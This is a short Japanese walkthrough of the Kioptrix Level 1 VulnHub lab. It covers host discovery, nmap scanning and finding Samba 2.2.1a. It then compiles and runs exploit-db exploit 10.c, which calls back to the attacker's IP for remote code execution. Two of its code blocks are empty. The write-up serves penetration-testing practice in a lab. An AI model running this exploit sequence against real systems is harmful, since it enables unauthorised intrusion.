## Description
- Kioptrix: Level 1 (#1)を利用してバッファーオーバーフローによる特権昇格を学ぶ
- Kalilinuxを攻撃サーバとしてVM環境に構築。KioptrixもVM環境で構築する

### 参考情報
https://www.vulnhub.com/
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

Kalilinuxの構築
https://qiita.com/y-araki-qiita/items/4621a21e9f0d2e38c331
Kiopritrixのサーバ構築
https://medium.com/@obikag/how-to-get-kioptrix-working-on-virtualbox-an-oscp-story-c824baf83da1

## 1, IPアドレスを特定する
- `netdiscover`コマンドにてIPを調査

## 2, 特定したIPに対してNmapスキャンを実行し、使用しているサービスを特定する
- `nmap`コマンドにて使用サービスを調査 

nmapの引数は100を超えるらしい...
https://ja.wikipedia.org/wiki/Nmap
```
$ sudo nmap -Pn 192.168.11.10
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-17 22:08 JST
Nmap scan report for 192.168.11.10
Host is up (0.00074s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 08:00:27:BA:2D:16 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds
```
6つのポートが空いてるのを確認

- Nmapスキャンでもっと詳しく調べてみるO
```
$ sudo nmap -Pn -T4 -sV -A -v 192.168.11.10
```

## 3, スキャンした [PORT：139 SMB PROTOCOL]に注目し、脆弱性がないかチェックする
- `msfconsole`コマンドでペネストレーションテスト
```
```
sambaのバージョンが`Samba 2.2.1a`であることが確認出来た。

## 4, Samba 2.2.1aに脆弱性がないか調査
- `searchsploit samba 2.2`
```
```
2.2.8以下は `Remote Buffer Overflow`, `Remote Code Execution`の脆弱性があることが確認出来た。

## 5, Remote Code Executionを発生させる
```
$ cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./
$ gcc -o samba 10.c
$ sudo chmod 755 samba
$ ./samba
$ ./samba -b0 -c <Your IP> <Target IP>
```

## 6, ヒントにMailとあるのでmailコマンドで探索
```
mail
```
フラグをゲット！
